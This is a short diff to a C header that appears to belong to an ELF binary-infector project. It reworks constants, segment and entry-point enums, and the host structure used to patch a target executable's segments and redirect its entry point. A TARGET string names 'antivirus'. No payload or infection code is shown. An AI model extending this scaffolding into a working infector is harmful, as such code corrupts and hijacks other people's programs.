@@ -35,9 +35,10 @@
 #define LEFT 0
 #define RIGHT 1
 
-#define BUFF_SIZE 8192
-
-#define JMP_SIZE 4
+#define BUFF_SIZE 0x2000
+#define PAGE_SIZE 0x1000
+#define STUB_SIZE 0x40
+#define JUMP_SIZE 0x4
 
 #define TARGET "antivirus"
 
@@ -50,6 +51,22 @@ enum e_context
 	SUCCESS,
 	FAILURE,
 	ABORT,
+	CONTEXT_SIZE,
+};
+
+enum e_segment
+{
+	TEXT,
+	DATA,
+	NOTE,
+	SEGMENT_SIZE,
+};
+
+enum e_entry
+{
+	OLD,
+	NEW,
+	ENTRY_SIZE,
 };
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -71,29 +88,14 @@ struct s_directory
 	ssize_t entry;
 };
 
-struct s_note
-{
-	Elf64_Phdr *data;
-	Elf64_Phdr *self;
-};
-
-struct s_text
-{
-
-};
-
 struct s_host
 {
 	Elf64_Ehdr *header;
+	Elf64_Phdr *segment[SEGMENT_SIZE];
+	Elf64_Addr entry[ENTRY_SIZE];
 
 	size_t filesize;
 	char *filename;
-
-	struct s_note *note;
-	struct s_text *text;
-
-	Elf64_Addr old_entry;
-	Elf64_Addr new_entry;
 
 	void *rsp;
 };
